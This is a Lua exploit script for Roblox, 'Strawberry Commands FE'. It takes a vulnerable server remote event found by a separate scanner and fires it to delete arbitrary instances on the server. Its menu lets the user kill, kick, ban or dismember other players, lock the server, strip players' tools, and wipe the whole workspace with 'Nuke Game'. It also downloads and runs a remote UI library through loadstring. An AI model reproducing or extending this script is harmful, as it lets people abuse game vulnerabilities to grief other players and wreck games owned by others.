-- the commands themselves, the scanner is more important tbh
-- messy code, contributions welcome like always
-- very little documentation/comments so please try to read the code good
-- last updated: 9/12/25

local HookedRemote = game.Players.LocalPlayer.PlayerGui:WaitForChild("StrawberryHookedRM", 5)
HookedRemote = HookedRemote.Value -- value of object value which is the vulnerable remote event itself

local function Delete(Object) -- serversided delete instance :sobsobsob: (read the scanner code if ur confused and come back)
	HookedRemote:FireServer(Object)
end

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

-- now that the logic is done, heres the code for the commands and UI

local Library = loadstring(game:HttpGet("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()

local Window = Library:CreateWindow{
	Title = "Strawberry Commands FE | v1.2.7",
	SubTitle = " ",
	TabWidth = 160,
	Size = UDim2.fromOffset(830, 525),
	Resize = true,
	MinSize = Vector2.new(470, 380),
	Acrylic = true,
	Theme = "Rose",
	MinimizeKey = Enum.KeyCode.RightControl
}

local Tabs = {
	Players = Window:CreateTab{
		Title = "Players",
		Icon = "users"
	},
	World = Window:CreateTab{
		Title = "World",
		Icon = "globe"
	},
	Other = Window:CreateTab{
		Title = "Other",
		Icon = "wrench"
	},
	Settings = Window:CreateTab{
		Title = "Settings",
		Icon = "settings"
	}
}

local Options = Library.Options

Library:Notify{
	Title = "Strawberry",
	Content = "Hooked vuln and loaded!",
	Duration = 5
}

local function ParseTarget(targetstring)
	-- if they provide "OTHERS" it will provide a table of the characters of all other players (same thing with ALL and ME but different return values)
	-- if they provide a players name, it will return the players character

	if targetstring == "ME" then
		local characters = { Player.Character or Player.CharacterAdded:Wait() }
		return characters
	elseif targetstring == "ALL" then
		local characters = {}

		for _, vplayer in ipairs(Players:GetPlayers()) do
			if vplayer.Character then
				table.insert(characters, vplayer.Character)
			end
		end

		return characters
	elseif targetstring == "OTHERS" then
		local characters = {}

		for _, vplayer in ipairs(Players:GetPlayers()) do
			if vplayer.Character and vplayer.Name ~= Player.Name then
				table.insert(characters, vplayer.Character)
			end
		end

		return characters
	end

	-- if it got to this point, they are not using a static string and will switch to player names
	for _, vplayer in ipairs(Players:GetPlayers()) do
		if vplayer.Name == targetstring then
			if vplayer.Character then
				local characters = { vplayer.Character }
				return characters
			end
		end
	end
end

local Target = Tabs.Players:CreateDropdown("Dropdown", {
	Title = "Target",
	Values = {},
	Multi = false,
})

local TargetString = nil

Target:OnChanged(function(Value)
	TargetString = Value
end)

local static = {"ALL", "OTHERS", "ME"}

local function refresh()
	local t = {unpack(static)}
	for _, p in ipairs(game.Players:GetPlayers()) do
		table.insert(t, p.Name)
	end
	Target:SetValues(t)
end

refresh()
game.Players.PlayerAdded:Connect(refresh)
game.Players.PlayerRemoving:Connect(refresh)

local Paragraph = Tabs.Players:CreateParagraph("Paragraph", {
	Title = "Warning: Everything below will need a selected target!"
})

Tabs.Players:CreateButton{
	Title = "Kill",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, v in ipairs(Characters) do
			if v:FindFirstChild("Head") then
				Delete(v:FindFirstChild("Head")) -- removing the head which kills the player
			end
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Kick",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, v in ipairs(Characters) do
			Delete(Players:GetPlayerFromCharacter(v)) -- removing the playerinstance which kicks the player
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Remove Meshes",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, v in ipairs(Characters) do
			for _, m in ipairs(v:GetDescendants()) do
				if m:IsA("SpecialMesh") or m:IsA("MeshPart") then
					Delete(m)
				end
			end
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Cancel Animations",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, v in ipairs(Characters) do
			Delete(v:FindFirstChild("Animate"))
		end
	end
}

local bannedplayers = {}

Tabs.Players:CreateButton{
	Title = "Server Ban",
	Callback = function()
		local Characters = ParseTarget(TargetString)
		
		for _, c in ipairs(Characters) do
			local plr = Players:GetPlayerFromCharacter(c)
			if not table.find(bannedplayers, plr) then
				table.insert(bannedplayers, plr)
				Delete(plr)
			end
		end
	end
}

Players.PlayerAdded:Connect(function(plr)
	if table.find(bannedplayers, plr) then
		Delete(plr)
	end
end)

Tabs.Other:CreateButton{
	Title = "Delete Tool",
	Callback = function()
		local mouse = Player:GetMouse()
		local equipped = false

		local tool = Instance.new("Tool",Player:FindFirstChild("Backpack"))
		tool.Name = "Delete Tool"
		tool.RequiresHandle = false

		tool.Equipped:Connect(function()
			equipped = true
		end)
		tool.Equipped:Connect(function()
			equipped = false
		end)

		tool.Activated:Connect(function()
			if not equipped then return end
			if mouse.Target then
				Delete(mouse.Target)
			end
		end)
	end
}

Tabs.Other:CreateButton{
	Title = "Delete Welds Tool",
	Callback = function()
		local mouse = Player:GetMouse()
		local equipped = false

		local tool = Instance.new("Tool",Player:FindFirstChild("Backpack"))
		tool.Name = "Delete Welds Tool"
		tool.RequiresHandle = false

		tool.Equipped:Connect(function()
			equipped = true
		end)
		tool.Equipped:Connect(function()
			equipped = false
		end)

		tool.Activated:Connect(function()
			if not equipped then return end
			if mouse.Target then
				for _, v in ipairs(mouse.Target:GetDescendants()) do
					if v:IsA("Weld") then
						Delete(v)
					end
				end
			end
		end)
	end
}

-- If it ain't broken, don't fix it!

local curplayers = {}
local slocked = true --its oposite cuz of
local slock_toggle = Tabs.Players:CreateToggle("ServerLock", {Title = "Server Lock", Default = false })

slock_toggle:OnChanged(function()
	slocked = not slocked --this
	if slocked then
		for _, p in pairs(game:GetService("Players"):GetChildren()) do
			table.insert(curplayers, p.Name)
		end
		game:GetService("Players").PlayerAdded:Connect(function(plr)
			for _, ph in pairs(curplayers) do
				if plr.Name:find(ph) then
					Library:Notify{
						Title = "Unauthorized Player",
						Content = plr.Name..", tried joining but the game is ServerLocked",
						SubContent = "Serverlock is on!!!",
						Duration = 3.5
					}
					Delete(plr)
				end
			end
		end)
		game:GetService("Players").PlayerRemoving:Connect(function(plr)
			for _, ph in pairs(curplayers) do
				if plr.Name:find(ph) then
					table.remove(curplayers, plr.Name)
				end
			end
		end)
	else
		curplayers = {}
	end
end)

Tabs.World:CreateButton{
	Title = "Nuke Game",
	Callback = function()
		for _, instance in ipairs(workspace:GetDescendants()) do
 		   pcall(function()
		        Delete(instance)
		    end)
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Ragdoll Player",
	Callback = function()
		local Characters = ParseTarget(TargetString)
		
		for _, c in ipairs(Characters) do
			Delete(c:FindFirstChild("HumanoidRootPart"))
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Brickify",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, c in ipairs(Characters) do
			Delete(c:FindFirstChild("Humanoid"))
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Blockhead",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, c in ipairs(Characters) do
			Delete(c.Head:FindFirstChildWhichIsA("SpecialMesh"))
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Korbloxify",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, c in ipairs(Characters) do
			if c:FindFirstChild("Torso") then
				local limbs = {"Right Leg"}
				for _, limb in ipairs(limbs) do
					local part = c:FindFirstChild(limb)
					if part then Delete(part) end
				end
			elseif c:FindFirstChild("UpperTorso") then
				local limbs = {
					"RightUpperLeg", "RightLowerLeg", "RightLeg"
				}
				for _, limb in ipairs(limbs) do
					local part = c:FindFirstChild(limb)
					if part then Delete(part) end
				end
			end
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Delete Player's Tools",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, c in ipairs(Characters) do
			local user: Player = Players:FindFirstChild(c.Name)
			for  _, t: Tool in ipairs(user.Backpack) do
				if t:IsA("Tool") then
					Delete(t)
				end
			end
			for  _, t: Tool in ipairs(c) do
				if t:IsA("Tool") then
					Delete(t)
				end
			end
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Remove Player's Limbs",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, c in ipairs(Characters) do
			local player = Players:FindFirstChild(c.Name)
			if player and player.Character then
				local character = player.Character
				if character:FindFirstChild("Torso") then
					local limbs = {"Left Arm", "Left Leg", "Right Arm", "Right Leg"}
					for _, limb in ipairs(limbs) do
						local part = character:FindFirstChild(limb)
						if part then Delete(part) end
					end
				elseif character:FindFirstChild("UpperTorso") then
					local limbs = {
						"LeftUpperArm", "LeftLowerArm", "LeftArm",
						"LeftUpperLeg", "LeftLowerLeg", "LeftLeg",
						"RightUpperArm", "RightLowerArm", "RightArm",
						"RightUpperLeg", "RightLowerLeg", "RightLeg"
					}
					for _, limb in ipairs(limbs) do
						local part = character:FindFirstChild(limb)
						if part then Delete(part) end
					end
				end
			end
		end
	end
}

Tabs.Players:CreateButton{
	Title = "Punish",
	Callback = function()
		local Characters = ParseTarget(TargetString)

		for _, v in ipairs(Characters) do
			if v:FindFirstChild("Head") then
				Delete(v)
			end
		end
	end
}

local Paragraph = Tabs.Settings:CreateParagraph("Paragraph", {
	Title = "Adding settings menu soon...",
	Content = "too lazy to add rn, also splitting all the commands in different tabs based on what they do."
})
